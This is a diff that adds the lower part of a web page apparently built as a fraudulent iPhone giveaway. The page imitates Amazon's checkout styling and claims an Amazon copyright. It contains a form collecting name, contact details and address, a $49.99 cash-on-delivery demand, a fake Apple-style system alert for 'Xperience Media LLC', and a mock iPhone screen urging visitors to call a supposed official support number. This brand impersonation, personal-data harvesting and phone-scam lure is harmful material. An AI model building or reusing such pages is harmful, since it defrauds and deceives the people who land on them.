+      <button type="button" id="closeClaimModal" style="display: none !important; border: none; background: none; font-size: 20px; cursor: pointer; color: #565959; outline: none; padding: 0 4px;">&times;</button>
+    </div>
+    
+    <div id="claimModalBody" style="padding: 16px 14px; font-family: -apple-system, BlinkMacSystemFont, sans-serif; box-sizing: border-box;">
+      <div style="background-color: #ffffff; border: 1px solid #ddd; border-radius: 8px; padding: 18px 16px; box-sizing: border-box;">
+        <h2 style="font-size: 18px; font-weight: 700; color: #111; margin: 0 0 16px; text-align: left; font-family: -apple-system, BlinkMacSystemFont, sans-serif;">Add a shipping address</h2>
+        
+        <form id="giveawayClaimForm" onsubmit="event.preventDefault();">
+          <div style="display: flex; gap: 10px; margin-bottom: 12px; box-sizing: border-box;">
+            <div style="flex: 1; text-align: left;">
+              <label for="claimFirstName" style="display: block; font-size: 13px; font-weight: 700; color: #111; margin-bottom: 5px;">First Name</label>
+              <input type="text" id="claimFirstName" required placeholder="First Name" style="width: 100%; padding: 8px 10px; border: 1px solid #888c8c; border-radius: 4px; font-size: 13px; outline: none; box-sizing: border-box; font-family: inherit;">
+            </div>
+            <div style="flex: 1; text-align: left;">
+              <label for="claimLastName" style="display: block; font-size: 13px; font-weight: 700; color: #111; margin-bottom: 5px;">Last Name</label>
+              <input type="text" id="claimLastName" required placeholder="Last Name" style="width: 100%; padding: 8px 10px; border: 1px solid #888c8c; border-radius: 4px; font-size: 13px; outline: none; box-sizing: border-box; font-family: inherit;">
+            </div>
+          </div>
+          
+          <div style="margin-bottom: 12px; text-align: left; box-sizing: border-box;">
+            <label for="claimContact" style="display: block; font-size: 13px; font-weight: 700; color: #111; margin-bottom: 5px;">Contact Info (Phone or Email)</label>
+            <input type="text" id="claimContact" required placeholder="Mobile number or email for delivery updates" style="width: 100%; padding: 8px 10px; border: 1px solid #888c8c; border-radius: 4px; font-size: 13px; outline: none; box-sizing: border-box; font-family: inherit;">
+          </div>
+          
+          <div style="margin-bottom: 14px; text-align: left; box-sizing: border-box;">
+            <label for="claimCustomerAddress" style="display: block; font-size: 13px; font-weight: 700; color: #111; margin-bottom: 5px;">Delivery Address</label>
+            <textarea id="claimCustomerAddress" required rows="3" placeholder="Street address, P.O. box, company name, c/o" style="width: 100%; padding: 8px 10px; border: 1px solid #888c8c; border-radius: 4px; font-size: 13px; outline: none; resize: vertical; font-family: inherit; box-sizing: border-box;"></textarea>
+          </div>
+          
+          <!-- COD Card -->
+          <div style="background-color: #fff9e6; border: 1px solid #fcd200; border-radius: 8px; padding: 12px; margin-bottom: 16px; text-align: left; display: flex; align-items: flex-start; gap: 8px; box-sizing: border-box;">
+            <svg style="width: 16px; height: 16px; fill: #b12704; flex-shrink: 0; margin-top: 2px;" viewBox="0 0 24 24">
+              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/>
+            </svg>
+            <div>
+              <div style="font-size: 13px; font-weight: 700; color: #b12704;">COD Balance Due: $49.99</div>
+              <div style="font-size: 11px; color: #565959; margin-top: 2px; line-height: 1.35;">You will pay <strong>$49.99</strong> in cash to the delivery agent when your iPhone arrives. No online payment is needed.</div>
+            </div>
+          </div>
+          
+          <!-- Amazon Golden Button -->
+          <button type="submit" id="confirmClaimBtn" style="width: 100%; padding: 10px; font-size: 13px; font-weight: 500; border-radius: 8px; border: 1px solid #fcd200; background: #ffd814; box-shadow: 0 2px 5px rgba(213,217,217,.5); text-align: center; cursor: pointer; outline: none; color: #0f1111; font-family: inherit;">
+            Use this address
+          </button>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <!-- Apple UI System Alert Dialog (Glass OS Style) -->
+  <div class="modal-form" id="appleAlertPopup" style="max-width: 320px !important; border-radius: 18px !important; border: 1px solid rgba(255, 255, 255, 0.4) !important; box-shadow: 0 20px 50px rgba(0,0,0,0.15) !important; background-color: rgba(255, 255, 255, 0.35) !important; backdrop-filter: blur(30px) saturate(180%) !important; -webkit-backdrop-filter: blur(30px) saturate(180%) !important; text-align: center !important; font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Helvetica Neue', sans-serif !important; overflow: hidden !important;">
+    <div style="padding: 24px 16px 16px;">
+      <h3 style="color: #0f1111; font-size: 17px; font-weight: 600; margin: 0 0 8px; font-family: -apple-system, BlinkMacSystemFont, sans-serif;">
+        Xperience Media LLC
+      </h3>
+      <div style="color: #1c1c1e; font-size: 13px; line-height: 1.45; font-weight: 400; text-align: center; max-height: 240px; overflow-y: auto; padding: 0 4px; font-family: -apple-system, BlinkMacSystemFont, sans-serif;">
+        <p style="margin-bottom: 12px; font-weight: 500;">Xperience Media LLC is a agency specialized in high-quality content marketing, and social media strategy. We help businesses, brands, and entrepreneurs craft compelling visual stories that engage audiences and drive growth.</p>
+        <p style="margin: 0; font-weight: 500;">Our team offers marketing, and social media strategy for Google ads, Facebook ads, Snapchat Ads, Google SEO, Software Development and unique mobile ui design. Our comprehensive social media campaigns that boost online presence and engagement for our clients. All of our payments will be made via invoice and website. Most of our clients make payment in 30 mins.</p>
+      </div>
+    </div>
+    <div style="border-top: 1px solid rgba(255, 255, 255, 0.3); display: flex; width: 100%; background-color: rgba(255, 255, 255, 0.1);">
+      <button type="button" id="appleAlertOkBtn" style="flex: 1; border: none; background: none; padding: 12px 16px; font-size: 17px; font-weight: 500; color: #ff3b30; cursor: pointer; font-family: -apple-system, BlinkMacSystemFont, sans-serif; outline: none; -webkit-tap-highlight-color: transparent; border-right: 1px solid rgba(255, 255, 255, 0.3);">
+        Cancel
+      </button>
+      <button type="button" id="appleAlertCallBtn" class="vibrate-btn" style="flex: 1; border: none; background: none; padding: 12px 16px; font-size: 17px; font-weight: 700; color: #007aff; cursor: pointer; font-family: -apple-system, BlinkMacSystemFont, sans-serif; outline: none; -webkit-tap-highlight-color: transparent;">
+        Call Now
+      </button>
+    </div>
+  </div>
+
+  <!-- Custom iPhone Shell Background Container -->
+  <div id="popupBgContainer" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 375px; height: 750px; background-color: #000000; border-radius: 40px; border: 12px solid #000000; box-shadow: 0 25px 60px rgba(0,0,0,0.3); z-index: 1001; font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Helvetica Neue', sans-serif; overflow: hidden; animation: modalScaleUp 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);">
+    <!-- iPhone App Header Navigation Bar (Black Bar with Apple Logo) -->
+    <div style="background-color: #000000; height: 55px; width: 100%; display: flex; align-items: center; justify-content: center; border-bottom: 1px solid #1a1a1a; position: relative; z-index: 1002;">
+      <!-- White Apple Logo SVG -->
+      <svg style="width: 17px; height: 21px; fill: #ffffff;" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg">
+        <path d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-48.7-22.9-84.5-22.9C65.3 137.1 29 173 13.9 221.5c-31.9 103 9.3 268.7 54.1 331.6 22 31.3 48.2 65 84.7 63.6 34.5-1.4 48.7-22.2 90.6-22.2 41.7 0 54.8 22.2 90.6 21.5 37.5-.7 60.7-30.7 82.6-63.6 25.2-37 35.6-72.8 36.2-74.6-1.2-.5-69.8-27-70.5-109.2zM249.9 86.1c15.6-18.9 26.2-45.2 23.3-71.3-22.3 1-49.6 15.2-65.6 34-13.5 15.6-25.3 42.3-22.2 67.9 24.9 2 50.4-13.5 64.5-30.6z"/>
+      </svg>
+    </div>
+
+    <!-- iPhone Screen Body (Full-Screen Image Background) -->
+    <div id="iphoneScreenBody" style="position: relative; height: calc(100% - 55px); width: 100%; background: url('images/support_employee.png') no-repeat center center / cover; transition: filter 0.4s ease;">
+      <!-- Call Support Glassmorphic Panel Overlay -->
+      <div style="position: absolute; bottom: 32px; left: 16px; right: 16px; background-color: rgba(255, 255, 255, 0.78); backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px); border-radius: 18px; padding: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.15); border: 1px solid rgba(255,255,255,0.4); text-align: center; z-index: 1002;">
+        <h2 style="font-size: 19px; font-weight: 800; color: #1d1d1f; margin-bottom: 6px; font-family: -apple-system, BlinkMacSystemFont, sans-serif; letter-spacing: -0.5px;">
+          Call Official Support
+        </h2>
+        <div style="font-size: 25px; font-weight: 800; color: #007aff; margin-bottom: 10px; font-family: -apple-system, BlinkMacSystemFont, sans-serif; letter-spacing: -0.5px;">
+          <a href="tel:+18009810293" style="color: #007aff; text-decoration: none;">+1 800-981-0293</a>
+        </div>
+        <p style="font-size: 12px; color: #434345; margin: 0; line-height: 1.45; font-weight: 500;">An official customer support executive is waiting to assist you. Tap the number above to connect immediately.</p>
+      </div>
+    </div>
+
+    <!-- iOS Home Indicator Swipe Bar -->
+    <div style="position: absolute; bottom: 8px; left: 50%; transform: translateX(-50%); width: 120px; height: 5px; background-color: #000000; border-radius: 2.5px; z-index: 1003;"></div>
+  </div>
+
+  <!-- Page Footer -->
+  <footer class="page-footer">
+    <div class="back-to-top" id="backToTopBtn">
+      Back to top
+    </div>
+    
+    <div class="footer-links">
+      <div class="footer-column">
+        <h5>Get to Know Us</h5>
+        <ul>
+          <li><a href="#">About Xperience Media</a></li>
+          <li><a href="#">Our Engineering Standards</a></li>
+          <li><a href="#">Case Studies & Growth Results</a></li>
+          <li><a href="#">Client Testimonials</a></li>
+        </ul>
+      </div>
+      <div class="footer-column">
+        <h5>Giveaway Items</h5>
+        <ul>
+          <li><a href="#" class="filter-service-link" data-target="midnight">Midnight Black Model</a></li>
+          <li><a href="#" class="filter-service-link" data-target="blue">Ocean Blue Model</a></li>
+          <li><a href="#" class="filter-service-link" data-target="pink">Rose Pink Model</a></li>
+          <li><a href="#">Official Promotion Rules</a></li>
+        </ul>
+      </div>
+      <div class="footer-column">
+        <h5>Support & Resources</h5>
+        <ul>
+          <li><a href="#qaSection">Frequently Asked Questions</a></li>
+          <li><a href="#">Submit a Tech Ticket</a></li>
+          <li><a href="#">Schedule a Consultation</a></li>
+          <li><a href="#">Billing & Invoicing</a></li>
+        </ul>
+      </div>
+      <div class="footer-column">
+        <h5>Let Us Help You</h5>
+        <ul>
+          <li><a href="#">Your Account</a></li>
+          <li><a href="#">Orders & Service Subscriptions</a></li>
+          <li><a href="#">Rates & Custom Pricing</a></li>
+          <li><a href="#">Contact Us</a></li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="footer-copyright">
+      &copy; 1996-2026, Amazon.com, Inc. or its affiliates. Custom brand advertising page created for Xperience Media LLC.
+    </div>
+  </footer>
+
+  <script src="index.js"></script>
+</body>
+</html>
